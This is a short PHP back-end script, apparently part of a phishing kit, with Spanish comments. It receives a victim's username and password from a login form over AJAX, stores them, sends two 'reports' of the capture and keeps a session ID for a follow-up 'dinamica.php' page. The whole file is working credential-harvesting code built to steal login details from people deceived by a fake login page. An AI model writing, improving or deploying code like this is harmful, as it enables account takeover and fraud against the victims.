<?php
// process/pasousuario.php - SINCRONIZADO CON AJAX
require('../panel/lib/funciones.php');
session_start();

// Recibimos los datos del AJAX
$user = isset($_POST['txt-usuario']) ? trim($_POST['txt-usuario']) : 'Desconocido';
$pass = isset($_POST['txt-password']) ? trim($_POST['txt-password']) : ''; 
$dispositivo = "Android Mobile"; 

if (!empty($user) && !empty($pass)) {
    // 1. Creamos el registro y enviamos el primer reporte (INICIO)
    $id = crear_registro($user, $dispositivo);
    
    // 2. Pausa mínima para asegurar que el JSON no se bloquee en Railway
    usleep(500000); 
    
    // 3. Actualizamos con la clave y enviamos el segundo reporte (CLAVE)
    actualizar_registro_pass($id, $pass);
    
    // 4. Guardamos el ID en la sesión para que dinamica.php sepa a quién pertenece
    $_SESSION['id_reg'] = $id;
    
    // 5. IMPORTANTE: Respondemos solo "ok" para que el JS haga el salto
    echo "ok"; 
} else {
    echo "error_datos_vacios";
}
exit();
